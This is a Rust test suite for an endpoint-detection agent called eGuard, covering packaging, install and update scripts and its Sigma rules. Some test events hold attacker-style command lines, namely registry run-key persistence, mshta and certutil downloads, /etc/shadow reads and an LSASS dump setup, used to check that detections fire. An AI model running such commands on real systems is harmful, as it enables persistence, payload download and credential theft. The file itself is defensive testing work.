use std::path::{Path, PathBuf};

use detection::{DetectionEngine, EventClass, TelemetryEvent};
use grpc_client::{pb, Client};

fn workspace_root() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("..")
        .join("..")
}

fn repo_rule(rule_path: &str) -> String {
    std::fs::read_to_string(workspace_root().join(rule_path)).expect("read repo rule")
}

fn read(rel: &str) -> String {
    std::fs::read_to_string(workspace_root().join(rel))
        .unwrap_or_else(|err| panic!("read {rel}: {err}"))
}

fn non_comment_lines(raw: &str) -> Vec<String> {
    raw.lines()
        .map(str::trim)
        .filter(|line| !line.is_empty() && !line.starts_with('#'))
        .map(ToOwned::to_owned)
        .collect()
}

fn bullet_entries(raw: &str) -> Vec<String> {
    raw.lines()
        .filter_map(|line| line.trim().strip_prefix("- "))
        .map(str::trim)
        .filter(|line| !line.is_empty())
        .map(ToOwned::to_owned)
        .collect()
}

fn has_line(lines: &[String], expected: &str) -> bool {
    lines.iter().any(|line| line == expected)
}

fn script_lock() -> &'static std::sync::Mutex<()> {
    super::shared_env_var_lock()
}

fn temp_dir(prefix: &str) -> PathBuf {
    let dir = std::env::temp_dir().join(format!(
        "{prefix}-{}",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or_default()
    ));
    std::fs::create_dir_all(&dir).expect("create temp dir");
    dir
}

fn write_exec(path: &Path, content: &str) {
    std::fs::write(path, content).expect("write mock executable");
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perm = std::fs::metadata(path).expect("metadata").permissions();
        perm.set_mode(0o755);
        std::fs::set_permissions(path, perm).expect("chmod");
    }
}

fn install_mock_tools(bin_dir: &Path) {
    for tool in [
        "curl",
        "dpkg",
        "rpm",
        "systemctl",
        "sha256sum",
        "install",
        "tee",
        "cargo",
        "zig",
        "strip",
        "ar",
    ] {
        let script = format!(
            "#!/bin/bash
set -euo pipefail
echo \"{} $*\" >> \"${{MOCK_LOG}}\"
case \"{}\" in
  curl)
    out=\"\"
    while [[ $# -gt 0 ]]; do
      if [[ \"$1\" == \"-o\" ]]; then
        out=\"${{2:-}}\"
        shift 2
      else
        shift
      fi
    done
    if [[ -n \"$out\" && \"${{MOCK_CURL_WRITE:-0}}\" == \"1\" ]]; then
      mkdir -p \"$(dirname \"$out\")\" 2>/dev/null || true
      printf 'mock-package' > \"$out\" 2>/dev/null || true
    fi
    ;;
  sha256sum)
    cat >/dev/null || true
    exit 0
    ;;
  install)
    target=\"${{@: -1}}\"
    if [[ -n \"$target\" ]]; then
      mkdir -p \"$target\" 2>/dev/null || true
    fi
    exit 0
    ;;
  tee)
    cat >/dev/null || true
    exit 0
    ;;
  ar)
    if [[ \"${{1:-}}\" == \"t\" || \"${{1:-}}\" == \"x\" ]]; then
      exit 0
    fi
    if [[ \"${{1:-}}\" == \"rcs\" ]]; then
      archive=\"${{2:-}}\"
      if [[ -n \"$archive\" ]]; then
        mkdir -p \"$(dirname \"$archive\")\" 2>/dev/null || true
        : > \"$archive\"
      fi
      exit 0
    fi
    exit 0
    ;;
esac
",
            tool, tool
        );
        write_exec(&bin_dir.join(tool), &script);
    }
}

#[test]
// AC-PKG-001 AC-PKG-002 AC-PKG-003 AC-PKG-031
fn package_manifests_define_agent_and_optional_rules_for_deb_and_rpm() {
    let deb_control = read("packaging/debian/control");
    let deb_lines = non_comment_lines(&deb_control);
    let deb_packages: Vec<String> = deb_lines
        .iter()
        .filter_map(|line| line.strip_prefix("Package: ").map(ToOwned::to_owned))
        .collect();
    assert!(deb_packages.iter().any(|pkg| pkg == "eguard-agent"));
    assert!(deb_packages.iter().any(|pkg| pkg == "eguard-agent-rules"));

    let rpm_spec = read("packaging/rpm/eguard-agent.spec");
    let rpm_lines = non_comment_lines(&rpm_spec);
    assert!(has_line(&rpm_lines, "Name: eguard-agent"));
    assert!(has_line(&rpm_lines, "%package rules"));

    let core_manifest = read("packaging/manifest/eguard-agent.contents");
    let core_entries = non_comment_lines(&core_manifest);
    for required in [
        "/usr/bin/eguard-agent",
        "/usr/lib/eguard-agent/ebpf/process_exec_bpf.o",
        "/usr/lib/eguard-agent/ebpf/file_open_bpf.o",
        "/usr/lib/eguard-agent/ebpf/file_write_bpf.o",
        "/usr/lib/eguard-agent/ebpf/file_rename_bpf.o",
        "/usr/lib/eguard-agent/ebpf/file_unlink_bpf.o",
        "/usr/lib/eguard-agent/ebpf/tcp_connect_bpf.o",
        "/usr/lib/eguard-agent/ebpf/dns_query_bpf.o",
        "/usr/lib/eguard-agent/ebpf/module_load_bpf.o",
        "/usr/lib/eguard-agent/ebpf/lsm_block_bpf.o",
        "/usr/lib/eguard-agent/ebpf-perf/process_exec_bpf.o",
        "/usr/lib/eguard-agent/ebpf-perf/file_open_bpf.o",
        "/usr/lib/eguard-agent/ebpf-perf/file_write_bpf.o",
        "/usr/lib/eguard-agent/ebpf-perf/file_rename_bpf.o",
        "/usr/lib/eguard-agent/ebpf-perf/file_unlink_bpf.o",
        "/usr/lib/eguard-agent/ebpf-perf/tcp_connect_bpf.o",
        "/usr/lib/eguard-agent/ebpf-perf/dns_query_bpf.o",
        "/usr/lib/eguard-agent/ebpf-perf/module_load_bpf.o",
        "/usr/lib/eguard-agent/ebpf-perf/lsm_block_bpf.o",
        "/usr/lib/systemd/system/eguard-agent.service",
        "/etc/eguard-agent/agent.conf",
    ] {
        assert!(
            core_entries.iter().any(|entry| entry.ends_with(required)),
            "missing core payload: {required}"
        );
    }

    let rules_manifest = read("packaging/manifest/eguard-agent-rules.contents");
    let rules_entries = non_comment_lines(&rules_manifest);
    for required in [
        "/var/lib/eguard-agent/rules/sigma/default_webshell.yml",
        "/var/lib/eguard-agent/rules/sigma/linux_reverse_shell_devtcp.yml",
        "/var/lib/eguard-agent/rules/sigma/linux_ld_preload_defense_evasion.yml",
        "/var/lib/eguard-agent/rules/sigma/linux_download_exec.yml",
        "/var/lib/eguard-agent/rules/sigma/linux_persistence_cron_systemd.yml",
        "/var/lib/eguard-agent/rules/sigma/linux_ssh_lateral_movement.yml",
        "/var/lib/eguard-agent/rules/sigma/linux_data_staging_archive.yml",
        "/var/lib/eguard-agent/rules/sigma/windows_mshta_lolbin_download.yml",
        "/var/lib/eguard-agent/rules/sigma/windows_certutil_download.yml",
        "/var/lib/eguard-agent/rules/yara/default.yar",
        "/var/lib/eguard-agent/rules/ioc/default_ioc.txt",
    ] {
        assert!(
            rules_entries.iter().any(|entry| entry == required),
            "missing rules payload: {required}"
        );
    }

    for required in core_entries.iter().chain(rules_entries.iter()) {
        assert!(
            rpm_lines.iter().any(|entry| entry == required),
            "rpm spec missing payload entry: {required}"
        );
    }
}

#[test]
fn linux_agent_core_manifest_enables_ebpf_libbpf_for_platform_linux() {
    let manifest = read("crates/agent-core/Cargo.toml");
    assert!(
        manifest.contains(
            "platform-linux = { path = \"../platform-linux\", features = [\"ebpf-libbpf\"] }"
        ),
        "agent-core must enable platform-linux/ebpf-libbpf so plain Linux builds keep eBPF telemetry alive"
    );
}

#[test]
// AC-PKG-004 AC-PKG-005 AC-PKG-006 AC-PKG-007 AC-PKG-008 AC-PKG-009 AC-PKG-010 AC-PKG-011 AC-PKG-012
// AC-PKG-028 AC-PKG-029 AC-PKG-030 AC-PKG-031 AC-PKG-032 AC-PKG-033
fn repo_sigma_rules_compile_from_rules_directory() {
    let mut detection = DetectionEngine::default_with_rules();
    let sigma_dir = workspace_root().join("rules/sigma");
    let loaded = detection
        .load_sigma_rules_from_dir(&sigma_dir)
        .expect("load repo sigma rules");

    assert!(loaded >= 10, "loaded {loaded} sigma rules, want >= 10");
}

#[test]
fn linux_update_packaging_recovers_service_after_upgrade() {
    let service_unit = read("packaging/systemd/eguard-agent.service");
    assert!(
        service_unit.contains("TimeoutStopSec=15s"),
        "systemd unit should allow a longer graceful stop window during upgrades"
    );
    assert!(
        service_unit.contains("PrivateTmp=false"),
        "systemd unit must share host /tmp so Linux quarantine can reach real endpoint artifacts"
    );

    let postinstall = read("packaging/postinstall.sh");
    assert!(
        postinstall
            .contains("sed -i 's/^TimeoutStopSec=.*/TimeoutStopSec=15s/' \"$legacy_unit\" || true"),
        "postinstall should patch legacy /etc unit files to the safer stop timeout"
    );
    assert!(
        postinstall.contains("systemd-run --unit \"eguard-agent-postinstall-$(date +%s)\" --collect /bin/sh -c \"$recover_cmd\""),
        "postinstall should prefer delayed systemd-run recovery so upgrade cleanup cannot immediately undo it"
    );
    assert!(
        postinstall.contains("systemctl reset-failed eguard-agent.service || true"),
        "postinstall should clear failed state before restart"
    );
    assert!(
        postinstall.contains("systemctl restart eguard-agent.service || systemctl start eguard-agent.service || true"),
        "postinstall should retry service recovery after upgrade"
    );

    let install_script = read("scripts/install-eguard-agent.sh");
    assert!(
        install_script.contains("AmbientCapabilities=CAP_NET_ADMIN CAP_NET_RAW"),
        "installer fallback unit should preserve agent network capabilities"
    );
    assert!(
        install_script.contains("PrivateTmp=false"),
        "installer fallback unit must share host /tmp so fallback installs do not regress Linux quarantine visibility"
    );
    assert!(
        install_script.contains("ReadWritePaths=/etc/eguard-agent /var/lib/eguard-agent"),
        "installer fallback unit should keep the writable paths aligned with the packaged service"
    );
    assert!(
        install_script.contains("TimeoutStopSec=15s"),
        "installer fallback unit should keep the safer graceful-stop timeout"
    );
    assert!(
        install_script.contains("$SUDO systemctl daemon-reload || true"),
        "installer should reload systemd after package install so fresh package units are discovered before a fallback unit is created"
    );

    let preremove = read("packaging/preremove.sh");
    assert!(
        preremove.contains("upgrade|failed-upgrade|1)"),
        "preremove should skip stop/disable work during package upgrades"
    );
    assert!(
        preremove.contains("systemctl stop eguard-agent.service || true"),
        "preremove should still stop the service on real removals"
    );

    let worker_source =
        read("crates/agent-core/src/lifecycle/command_pipeline/update_agent/worker_linux.rs");
    assert!(
        worker_source.contains("systemctl reset-failed eguard-agent || true"),
        "linux update worker should clear failed service state after package install"
    );
    assert!(
        worker_source.contains("if ! systemctl restart eguard-agent; then"),
        "linux update worker should prefer a full service restart after package install"
    );
    assert!(
        worker_source.contains(
            "systemctl start eguard-agent || fail_outcome \"agent service restart failed after package install\""
        ),
        "linux update worker should still fall back to start and report failure if recovery cannot bring the service back"
    );
    assert!(
        worker_source.contains("Command::new(\"/bin/bash\")"),
        "linux update worker fallback should launch via /bin/bash so noexec update dirs do not block self-update"
    );
    assert!(
        worker_source.contains("write_outcome \"failed\"")
            || worker_source.contains("write_outcome \"completed\""),
        "linux update worker should persist outcome files for later command truth reporting"
    );
    assert!(
        worker_source.contains("--command-id"),
        "linux update worker should receive the originating command id"
    );
    assert!(
        worker_source.contains(".arg(\"/bin/bash\")"),
        "linux update worker systemd-run path should invoke /bin/bash explicitly"
    );
    assert!(
        worker_source.contains("internal_process_systemd_run_env_arg()"),
        "linux update worker should tag detached systemd-run workers so agent-owned maintenance does not recurse into telemetry"
    );
    assert!(
        worker_source.contains("mark_internal_command("),
        "linux update worker fallback should tag directly spawned maintenance workers as internal"
    );

    let config_change_source =
        read("crates/agent-core/src/lifecycle/command_pipeline/config_change.rs");
    assert!(
        config_change_source.contains("internal_process_systemd_run_env_arg()"),
        "linux self-restart scheduling should tag detached systemd-run work as internal telemetry noise"
    );

    let windows_worker_source =
        read("crates/agent-core/src/lifecycle/command_pipeline/update_agent/worker_windows.rs");
    assert!(
        windows_worker_source.contains("taskkill /F /PID $runningProc.Id"),
        "windows update worker should force-kill a lingering service process before replacing the binary without killing the detached updater itself"
    );
    assert!(
        windows_worker_source.contains("failureflag $ServiceName 0"),
        "windows update worker should disable non-crash failure recovery before killing the service"
    );
    assert!(
        windows_worker_source.contains("sc.exe config $ServiceName binPath="),
        "windows update worker should re-assert the canonical service binary path after update"
    );
    assert!(
        windows_worker_source
            .contains("Verify-FileHash -Path $agentPath -ExpectedSha256 $ExpectedSha256"),
        "windows EXE update worker should verify the installed binary hash after copy"
    );
    assert!(
        windows_worker_source.contains("failureflag $ServiceName 1"),
        "windows update worker should restore non-crash failure recovery after update"
    );
    assert!(
        windows_worker_source.contains("Write-Outcome -Status 'failed'"),
        "windows update worker should persist failed outcomes for later command truth reporting"
    );
    assert!(
        windows_worker_source.contains("[string]$CommandId"),
        "windows update worker should receive the originating command id"
    );

    let command_control_source =
        read("crates/agent-core/src/lifecycle/command_control_pipeline.rs");
    assert!(
        command_control_source.contains("self.flush_update_outcome_reports().await;"),
        "connected command stage should flush persisted update outcomes before fetching new commands"
    );
}

#[test]
// AC-PKG-004 AC-PKG-005 AC-PKG-006 AC-PKG-007 AC-PKG-008 AC-PKG-009 AC-PKG-010 AC-PKG-011 AC-PKG-012
// AC-PKG-028 AC-PKG-029 AC-PKG-030 AC-PKG-031 AC-PKG-032 AC-PKG-033
fn package_build_harness_executes_and_emits_metrics_with_mocked_toolchain() {
    let _guard = script_lock().lock().unwrap_or_else(|e| e.into_inner());
    let root = workspace_root();
    let sandbox = temp_dir("eguard-pkg-build-test");
    let bin_dir = sandbox.join("bin");
    std::fs::create_dir_all(&bin_dir).expect("create mock bin");
    install_mock_tools(&bin_dir);
    let fake_bin = root.join("target/x86_64-unknown-linux-musl/release/agent-core");
    let fake_bin_preexisting = fake_bin.exists();
    if !fake_bin_preexisting {
        std::fs::create_dir_all(fake_bin.parent().expect("fake binary parent"))
            .expect("create fake bin parent");
        std::fs::write(&fake_bin, b"mock-agent-core").expect("write fake bin");
    }

    let log_path = sandbox.join("mock.log");
    let path = format!(
        "{}:/usr/bin:/bin:{}",
        bin_dir.display(),
        std::env::var("PATH").unwrap_or_default()
    );
    let status = std::process::Command::new("bash")
        .arg(root.join("scripts/build-agent-packages-ci.sh"))
        .current_dir(&root)
        .env("PATH", path)
        .env("MOCK_LOG", &log_path)
        .status()
        .expect("run package build harness");
    assert!(status.success());

    let log = std::fs::read_to_string(&log_path).expect("read mock log");
    let log_lines = non_comment_lines(&log);
    assert!(has_line(
        &log_lines,
        "cargo build --release --target x86_64-unknown-linux-musl -p agent-core"
    ));
    assert!(has_line(&log_lines, "zig build"));
    assert!(log_lines.iter().any(|line| line.starts_with("strip ")));

    let metrics_path = root.join("artifacts/package-agent/metrics.json");
    let metrics_raw = std::fs::read_to_string(&metrics_path).expect("read metrics");
    let metrics: serde_json::Value = serde_json::from_str(&metrics_raw).expect("parse metrics");
    assert_eq!(metrics["suite"], "package-agent");
    assert!(metrics["targets_mb"]["agent_binary"].is_null());
    assert_eq!(metrics["targets_mb"]["rules_package"], 5);
    assert_eq!(metrics["targets_mb"]["full_install"], 15);
    assert_eq!(metrics["targets_mb"]["runtime_rss"], 25);
    assert_eq!(metrics["targets_mb"]["distribution_budget"], 200);
    assert_eq!(metrics["component_budget"]["agent_binary_compressed_mb"], 7);
    assert_eq!(
        metrics["component_budget"]["ebpf_programs_compressed_kb"],
        100
    );
    assert_eq!(metrics["component_budget"]["asm_lib_compressed_kb"], 50);
    assert_eq!(
        metrics["component_budget"]["seed_baseline_compressed_kb"],
        10
    );
    assert_eq!(
        metrics["component_budget"]["default_config_compressed_kb"],
        5
    );
    assert_eq!(metrics["component_budget"]["systemd_unit_kb"], 1);

    for pkg in [
        "artifacts/package-agent/debian/eguard-agent_0.1.0_amd64.deb",
        "artifacts/package-agent/debian/eguard-agent-rules_0.1.0_amd64.deb",
        "artifacts/package-agent/rpm/eguard-agent-0.1.0-1.x86_64.rpm",
        "artifacts/package-agent/rpm/eguard-agent-rules-0.1.0-1.x86_64.rpm",
    ] {
        assert!(root.join(pkg).exists(), "expected package artifact: {pkg}");
    }

    let _ = std::fs::remove_dir_all(root.join("artifacts/package-agent"));
    if !fake_bin_preexisting {
        let _ = std::fs::remove_file(&fake_bin);
    }
    let _ = std::fs::remove_dir_all(&sandbox);
}

#[test]
// AC-PKG-013 AC-PKG-014 AC-PKG-015 AC-PKG-016
fn distribution_channels_cover_server_repo_manual_and_github_release() {
    let channels = read("packaging/repositories/channels.txt");
    let entries = bullet_entries(&channels);
    assert!(entries
        .iter()
        .any(|entry| entry == "https://<server>/api/v1/agent-install/linux-deb"));
    assert!(entries
        .iter()
        .any(|entry| entry == "https://<server>/api/v1/agent-install/linux-rpm"));
    assert!(entries
        .iter()
        .any(|entry| entry == "https://<server>/api/v1/agent-install/windows-exe"));
    assert!(entries
        .iter()
        .any(|entry| entry == "https://<server>/api/v1/agent-install/macos"));
    assert!(entries
        .iter()
        .any(|entry| entry == "apt repository (Debian/Ubuntu)"));
    assert!(entries
        .iter()
        .any(|entry| entry == "yum repository (RHEL/Fedora/Rocky)"));
    assert!(entries
        .iter()
        .any(|entry| entry == "Admin UI downloadable .deb/.rpm/.pkg files"));
    assert!(
        entries.iter().any(|entry| entry == "GitHub Releases"),
        "missing GitHub releases channel entry"
    );

    let workflow = read(".github/workflows/package-agent.yml");
    let workflow_lines = non_comment_lines(&workflow);
    assert!(has_line(
        &workflow_lines,
        "- name: Publish packages to GitHub Releases"
    ));
}

#[test]
// AC-PKG-017 AC-PKG-018 AC-PKG-019 AC-PKG-020 AC-PKG-021
fn install_script_executes_with_mocked_package_manager_and_systemd() {
    let _guard = script_lock().lock().unwrap_or_else(|e| e.into_inner());
    let root = workspace_root();
    let sandbox = temp_dir("eguard-install-test");
    let bin_dir = sandbox.join("bin");
    std::fs::create_dir_all(&bin_dir).expect("create mock bin");
    install_mock_tools(&bin_dir);
    let log_path = sandbox.join("mock.log");
    let path = format!(
        "{}:/usr/bin:/bin:{}",
        bin_dir.display(),
        std::env::var("PATH").unwrap_or_default()
    );

    let help = std::process::Command::new("bash")
        .arg(root.join("scripts/install-eguard-agent.sh"))
        .arg("--help")
        .current_dir(&root)
        .output()
        .expect("run install --help");
    assert!(help.status.success());
    assert!(String::from_utf8_lossy(&help.stdout)
        .lines()
        .any(|line| line
            == "Usage: install-eguard-agent.sh --server <host[:port]> [--token <token>] [--grpc-port <port>] [--url <package-url>]"));

    let missing_server = std::process::Command::new("bash")
        .arg(root.join("scripts/install-eguard-agent.sh"))
        .current_dir(&root)
        .output()
        .expect("run install missing server");
    assert!(!missing_server.status.success());
    assert!(String::from_utf8_lossy(&missing_server.stderr)
        .lines()
        .any(|line| line == "Error: --server is required"));

    let run = std::process::Command::new("bash")
        .arg(root.join("scripts/install-eguard-agent.sh"))
        .arg("--server")
        .arg("example.local:50052")
        .arg("--url")
        .arg("https://example.local/pkg.deb")
        .current_dir(&root)
        .env("PATH", path)
        .env("MOCK_LOG", &log_path)
        .env("MOCK_CURL_WRITE", "1")
        .output()
        .expect("run install script");
    assert!(run.status.success());
    let stdout_text = String::from_utf8_lossy(&run.stdout);
    let stdout_lines: Vec<&str> = stdout_text.lines().collect();
    assert!(stdout_lines.contains(&"eGuard Agent installed and enrolling with example.local:50052"));

    let log = std::fs::read_to_string(&log_path).expect("read mock log");
    let log_lines = non_comment_lines(&log);
    assert!(log_lines
        .iter()
        .any(|line| line.starts_with("curl -fsSL https://example.local/pkg.deb -o ")));
    // Debian-based runners should take dpkg path; if not, rpm path is acceptable.
    assert!(
        log_lines.iter().any(|line| line.starts_with("dpkg -i "))
            || log_lines.iter().any(|line| line.starts_with("rpm -i "))
    );
    assert!(has_line(&log_lines, "systemctl enable eguard-agent"));
    assert!(has_line(&log_lines, "systemctl start eguard-agent"));

    let _ = std::fs::remove_dir_all(&sandbox);
}

#[test]
// AC-PKG-022 AC-PKG-023 AC-PKG-024 AC-PKG-025 AC-PKG-026 AC-PKG-027
fn update_script_executes_deb_and_rpm_paths_with_mocked_installers() {
    let _guard = script_lock().lock().unwrap_or_else(|e| e.into_inner());
    let root = workspace_root();
    let sandbox = temp_dir("eguard-update-test");
    let bin_dir = sandbox.join("bin");
    std::fs::create_dir_all(&bin_dir).expect("create mock bin");
    install_mock_tools(&bin_dir);
    let log_path = sandbox.join("mock.log");
    let update_dir = sandbox.join("update");
    let path = format!(
        "{}:/usr/bin:/bin:{}",
        bin_dir.display(),
        std::env::var("PATH").unwrap_or_default()
    );

    let invalid = std::process::Command::new("bash")
        .arg(root.join("scripts/apply-agent-update.sh"))
        .arg("--server")
        .arg("example.local")
        .arg("--version")
        .arg("1.2.3")
        .arg("--checksum")
        .arg("abc")
        .arg("--format")
        .arg("zip")
        .current_dir(&root)
        .output()
        .expect("run invalid format");
    assert!(!invalid.status.success());
    assert!(String::from_utf8_lossy(&invalid.stderr)
        .lines()
        .any(|line| line == "error: --format must be deb or rpm"));

    let run_deb = std::process::Command::new("bash")
        .arg(root.join("scripts/apply-agent-update.sh"))
        .arg("--server")
        .arg("example.local")
        .arg("--version")
        .arg("1.2.3")
        .arg("--checksum")
        .arg("0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef")
        .arg("--format")
        .arg("deb")
        .current_dir(&root)
        .env("PATH", &path)
        .env("MOCK_LOG", &log_path)
        .env("MOCK_CURL_WRITE", "1")
        .env("EGUARD_UPDATE_DIR", &update_dir)
        .output()
        .expect("run deb update");
    assert!(
        run_deb.status.success(),
        "deb update failed: status={:?}\nstdout:\n{}\nstderr:\n{}",
        run_deb.status,
        String::from_utf8_lossy(&run_deb.stdout),
        String::from_utf8_lossy(&run_deb.stderr)
    );
    assert!(String::from_utf8_lossy(&run_deb.stdout)
        .lines()
        .any(|line| line
            == "updated eguard-agent to 1.2.3; next heartbeat reports updated agent_version"));

    let run_rpm = std::process::Command::new("bash")
        .arg(root.join("scripts/apply-agent-update.sh"))
        .arg("--server")
        .arg("example.local")
        .arg("--version")
        .arg("2.0.1")
        .arg("--checksum")
        .arg("feedfacefeedfacefeedfacefeedfacefeedfacefeedfacefeedfacefeedface")
        .arg("--format")
        .arg("rpm")
        .current_dir(&root)
        .env("PATH", &path)
        .env("MOCK_LOG", &log_path)
        .env("MOCK_CURL_WRITE", "1")
        .env("EGUARD_UPDATE_DIR", &update_dir)
        .output()
        .expect("run rpm update");
    assert!(
        run_rpm.status.success(),
        "rpm update failed: status={:?}\nstdout:\n{}\nstderr:\n{}",
        run_rpm.status,
        String::from_utf8_lossy(&run_rpm.stdout),
        String::from_utf8_lossy(&run_rpm.stderr)
    );
    assert!(String::from_utf8_lossy(&run_rpm.stdout)
        .lines()
        .any(|line| line
            == "updated eguard-agent to 2.0.1; next heartbeat reports updated agent_version"));

    let mut client = Client::new("127.0.0.1:50052".to_string());
    client.set_agent_version("2.0.1");
    assert_eq!(client.agent_version(), "2.0.1");

    let heartbeat = pb::HeartbeatResponse {
        heartbeat_interval_secs: 30,
        policy_update: None,
        rule_update: None,
        pending_commands: vec![pb::ServerCommand {
            command_id: "cmd-update-1".to_string(),
            command_type: pb::CommandType::RunScan as i32,
            issued_at: 1_700_000_000,
            issued_by: "server".to_string(),
            params: Some(pb::server_command::Params::Scan(pb::ScanParams {
                paths: vec!["/tmp".to_string()],
                yara_scan: true,
                ioc_scan: true,
            })),
        }],
        fleet_baseline: None,
        status: "ok".to_string(),
        server_time: String::new(),
    };
    assert_eq!(heartbeat.pending_commands.len(), 1);
    assert_eq!(heartbeat.pending_commands[0].command_id, "cmd-update-1");

    let log = std::fs::read_to_string(&log_path).expect("read mock log");
    let log_lines = non_comment_lines(&log);
    let deb_pkg = update_dir.join("eguard-agent-1.2.3.deb");
    let rpm_pkg = update_dir.join("eguard-agent-2.0.1.rpm");
    assert!(has_line(
        &log_lines,
        &format!(
            "curl -fsSL https://example.local/api/v1/agent-install/linux-deb?version=1.2.3 -o {}",
            deb_pkg.display()
        )
    ));
    assert!(has_line(
        &log_lines,
        &format!(
            "curl -fsSL https://example.local/api/v1/agent-install/linux-rpm?version=2.0.1 -o {}",
            rpm_pkg.display()
        )
    ));
    assert!(has_line(&log_lines, "sha256sum --check --status"));
    assert!(has_line(
        &log_lines,
        &format!("dpkg -i {}", deb_pkg.display())
    ));
    assert!(has_line(
        &log_lines,
        &format!("rpm -Uvh {}", rpm_pkg.display())
    ));

    let workflow = read(".github/workflows/package-agent.yml");
    let workflow_lines = non_comment_lines(&workflow);
    assert!(workflow_lines
        .iter()
        .any(|line| line.starts_with("gh release create ")));
    assert!(has_line(&workflow_lines, "echo \"sync apt repository\""));
    assert!(has_line(&workflow_lines, "echo \"sync yum repository\""));

    let _ = std::fs::remove_dir_all(&sandbox);
}

#[test]
fn repo_credential_access_rule_ignores_passwd_and_sudoers_noise_but_keeps_shadow_hits() {
    let mut engine = DetectionEngine::default_with_rules();
    engine
        .load_sigma_rule_yaml(&repo_rule("rules/sigma/credential_access.yml"))
        .expect("compile repo credential access rule");

    let mk_event = |path: &str, process: &str| TelemetryEvent {
        ts_unix: 1_700_000_000,
        event_class: EventClass::FileOpen,
        pid: 4242,
        ppid: 1,
        uid: 1000,
        process: process.to_string(),
        parent_process: "bash".to_string(),
        session_id: 4242,
        file_path: Some(path.to_string()),
        file_write: false,
        file_hash: None,
        dst_port: None,
        dst_ip: None,
        dst_domain: None,
        command_line: Some(process.to_string()),
        event_size: None,
        container_runtime: None,
        container_id: None,
        container_escape: false,
        container_privileged: false,
    };

    let passwd = engine.process_event(&mk_event("/etc/passwd", "sudo"));
    assert!(
        !passwd
            .temporal_hits
            .iter()
            .any(|hit| hit == "sigma_credential_access"),
        "/etc/passwd should not trigger the repo credential-access sigma rule"
    );

    let sudoers = engine.process_event(&mk_event("/etc/sudoers", "sudo"));
    assert!(
        !sudoers
            .temporal_hits
            .iter()
            .any(|hit| hit == "sigma_credential_access"),
        "/etc/sudoers should not trigger the repo credential-access sigma rule"
    );

    let shadow = engine.process_event(&mk_event("/etc/shadow", "cat"));
    assert!(
        shadow
            .temporal_hits
            .iter()
            .any(|hit| hit == "sigma_credential_access"),
        "/etc/shadow must still trigger the repo credential-access sigma rule"
    );
}

#[test]
fn repo_windows_runkey_rule_matches_cmd_wrapper_shape() {
    let mut engine = DetectionEngine::default_with_rules();
    engine
        .load_sigma_rule_yaml(&repo_rule(
            "rules/sigma/windows_registry_runkey_persistence.yml",
        ))
        .expect("compile repo windows runkey rule");

    let event = TelemetryEvent {
        ts_unix: 1_700_000_000,
        event_class: EventClass::ProcessExec,
        pid: 7331,
        ppid: 1,
        uid: 0,
        process: "cmd.exe".to_string(),
        parent_process: "powershell.exe".to_string(),
        session_id: 7331,
        file_path: None,
        file_write: false,
        file_hash: None,
        dst_port: None,
        dst_ip: None,
        dst_domain: None,
        command_line: Some("cmd.exe /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v EguardProof /t REG_SZ /d \"cmd.exe /c echo proof\" /f".to_string()),
        event_size: None,
        container_runtime: None,
        container_id: None,
        container_escape: false,
        container_privileged: false,
    };

    let out = engine.process_event(&event);
    assert!(
        out.temporal_hits
            .iter()
            .any(|hit| hit == "windows_registry_runkey_persistence"),
        "cmd.exe wrapper around reg add run-key persistence must match the repo sigma rule"
    );
}

#[test]
fn repo_windows_mshta_rule_matches_live_https_shape() {
    let mut engine = DetectionEngine::default_with_rules();
    engine
        .load_sigma_rule_yaml(&repo_rule("rules/sigma/windows_mshta_lolbin_download.yml"))
        .expect("compile repo windows mshta rule");

    let event = TelemetryEvent {
        ts_unix: 1_700_000_000,
        event_class: EventClass::ProcessExec,
        pid: 7441,
        ppid: 1,
        uid: 0,
        process: "mshta.exe".to_string(),
        parent_process: "cmd.exe".to_string(),
        session_id: 7441,
        file_path: None,
        file_write: false,
        file_hash: None,
        dst_port: None,
        dst_ip: None,
        dst_domain: None,
        command_line: Some("mshta.exe  https://example.com/eguard-mshta-proof.hta".to_string()),
        event_size: None,
        container_runtime: None,
        container_id: None,
        container_escape: false,
        container_privileged: false,
    };

    let out = engine.process_event(&event);
    assert!(
        out.temporal_hits
            .iter()
            .any(|hit| hit == "windows_mshta_lolbin_download"),
        "live mshta https wrapper shape must match the repo sigma rule"
    );
}

#[test]
fn repo_windows_certutil_rule_matches_live_urlcache_shape() {
    let mut engine = DetectionEngine::default_with_rules();
    engine
        .load_sigma_rule_yaml(&repo_rule("rules/sigma/windows_certutil_download.yml"))
        .expect("compile repo windows certutil rule");

    let event = TelemetryEvent {
        ts_unix: 1_700_000_000,
        event_class: EventClass::ProcessExec,
        pid: 7551,
        ppid: 1,
        uid: 0,
        process: "certutil.exe".to_string(),
        parent_process: "cmd.exe".to_string(),
        session_id: 7551,
        file_path: None,
        file_write: false,
        file_hash: None,
        dst_port: None,
        dst_ip: None,
        dst_domain: None,
        command_line: Some("certutil.exe -urlcache -split -f https://example.com/eguard-certutil-proof.bin C:\\Windows\\Temp\\eguard-certutil-proof.bin".to_string()),
        event_size: None,
        container_runtime: None,
        container_id: None,
        container_escape: false,
        container_privileged: false,
    };

    let out = engine.process_event(&event);
    assert!(
        out.temporal_hits
            .iter()
            .any(|hit| hit == "windows_certutil_download"),
        "live certutil urlcache wrapper shape must match the repo sigma rule"
    );
}

fn repo_windows_event(process: &str, parent: &str, command_line: &str) -> TelemetryEvent {
    TelemetryEvent {
        ts_unix: 1_700_000_000,
        event_class: EventClass::ProcessExec,
        pid: 9001,
        ppid: 1,
        uid: 0,
        process: process.to_string(),
        parent_process: parent.to_string(),
        session_id: 9001,
        file_path: None,
        file_write: false,
        file_hash: None,
        dst_port: None,
        dst_ip: None,
        dst_domain: None,
        command_line: Some(command_line.to_string()),
        event_size: None,
        container_runtime: None,
        container_id: None,
        container_escape: false,
        container_privileged: false,
    }
}

#[test]
fn repo_windows_lsass_rule_matches_comsvcs_minidump_shape() {
    let mut engine = DetectionEngine::default_with_rules();
    engine
        .load_sigma_rule_yaml(&repo_rule("rules/sigma/windows_lsass_access_dump.yml"))
        .expect("compile repo windows lsass dump rule");

    let out = engine.process_event(&repo_windows_event(
        "rundll32.exe",
        "cmd.exe",
